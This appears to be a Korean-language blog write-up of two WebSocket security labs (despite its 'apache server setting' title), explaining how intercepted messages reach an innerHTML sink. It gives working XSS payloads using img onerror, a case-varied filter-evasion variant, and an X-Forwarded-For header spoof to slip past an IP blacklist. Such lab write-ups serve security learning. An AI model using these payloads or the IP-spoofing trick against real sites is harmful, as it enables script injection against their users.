---
title: apache server setting
description: 
author: doxawahebi
date: 2025-02-25 15:39:00 +0900
categories: [web]
tags: [web, websocket, xss]     # TAG names should always be lowercase
pin: false
math: false
mermaid: false
---

## Manipulating WebSocket messages to exploit vulnerabilitie
---
메세지를 전송할 때 html encode 처리가 있기 때문에 메시지를 intercept한 후 XSS 페이로드를 보내야한다.
```js
function sendMessage(data) {
	var object = {};
	data.forEach(function (value, key) {
		object[key] = htmlEncode(value);
	});

	openWebSocket().then(ws => ws.send(JSON.stringify(object)));
}

function htmlEncode(str) {
	if (chatForm.getAttribute("encode")) {
		return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
			var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
			return lookup[c];
		});
	}
	return str;
}
```

다음 함수에서 `innerHTML` 때문에 XSS가 발생하는 것을 알 수 있다.
```js
    function writeMessage(className, user, content) {
        var row = document.createElement("tr");
        row.className = className

        var userCell = document.createElement("th");
        var contentCell = document.createElement("td");
        userCell.innerHTML = user;
        contentCell.innerHTML = (typeof window.renderChatMessage === "function") ? window.renderChatMessage(content) : content;

        row.appendChild(userCell);
        row.appendChild(contentCell);
        document.getElementById("chat-area").appendChild(row);
    }
```

intercept 후 다음과 같이 수정하면 XSS가 발생한다.
```json
{"message":"<img src=1 onerror=alert(1)>"}
```

## Manipulating the WebSocket handshake to exploit vulnerabilities
---
이 랩을 해결하는 방법은 지난 랩과 비슷하다. 
약간의 차이점은 블랙리스트 기능이 있다는 것이다.

해당 페이로드를 websocket을 통해 보내면 나의 IP는 차단된다. 서버에서 설정한 XSS filter에 의해 블랙리스트로 차단된다.
```html
<img src=1 onerror='alert(1)'>
```

request 헤더 부분에 `X-Forwarded-For: 1.1.1.1`를 추가하면 나의 IP를 속이고 XSS를 계속 수행할 수 있다.

다음과 같은 페이로드를 웹소켓으로 보내면 문제가 해결된다.
```html
<img src=1 oNeRrOr=alert`1`>
```


